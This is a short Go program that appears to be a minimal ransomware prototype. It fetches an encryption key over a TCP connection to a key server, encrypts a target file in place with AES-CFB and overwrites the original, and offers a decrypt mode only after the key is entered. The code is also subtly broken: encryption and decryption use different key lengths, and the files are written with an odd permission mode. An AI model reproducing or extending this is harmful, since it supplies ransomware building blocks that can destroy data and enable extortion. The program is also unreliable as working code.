package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"net"
	"os"
)

// encryption: https://gist.github.com/fracasula/38aa1a4e7481f9cedfa78a0cdd5f1865

func raw_connect(host string, ports string) string {
	conn, err := net.Dial("tcp", host+":"+ports)
	if err != nil {
		fmt.Println("Connecting error:", err)
	}
	if conn != nil {
		defer conn.Close()
		key := make([]byte, 1024)
		if _, err := conn.Read(key); err == nil {
			conn.Close()
			return string(key)
		}
	}
	return ""
}

func encrypt(key []byte, fn string) {
	content, err := os.ReadFile(fn)
	if err != nil {
		panic(err)
	}

	// Simple encryption
	block, err := aes.NewCipher(key[:aes.BlockSize])
	if err != nil {
		panic(fmt.Errorf("could not create new cipher: %v", err))
	}

	cT := make([]byte, aes.BlockSize+len(content))
	iv := cT[:aes.BlockSize]
	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		panic(fmt.Errorf("could not encrypt: %v", err))
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cT[aes.BlockSize:], content)

	// Write to file
	os.WriteFile(fn, cT, fs.FileMode(02))
}

func decrypt(key []byte, fn string) {
	content, err := os.ReadFile(fn)
	if err != nil {
		panic(err)
	}
	// Simple decryption
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(fmt.Errorf("could not create new cipher: %v", err))
	}

	if len(content) < aes.BlockSize {
		panic(fmt.Errorf("invalid ciphertext block size"))
	}

	iv := content[:aes.BlockSize]
	content = content[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(content, content)

	// Write to file
	os.WriteFile(fn, content, fs.FileMode(02))
}

func main() {
	file := flag.String("f", "asd.txt", "file to enc")
	decode := flag.Bool("d", false, "decrypt")
	port := flag.String("p", "443", "port to connect to")
	flag.Parse()

	if !*decode {
		enc_key := []byte(raw_connect("localhost", *port))
		encrypt(enc_key, *file)
	} else {
		var enc_key []byte
		fmt.Print("Enter decryption key: ")
		fmt.Scanln(&enc_key)
		decrypt(enc_key, *file)
	}
}
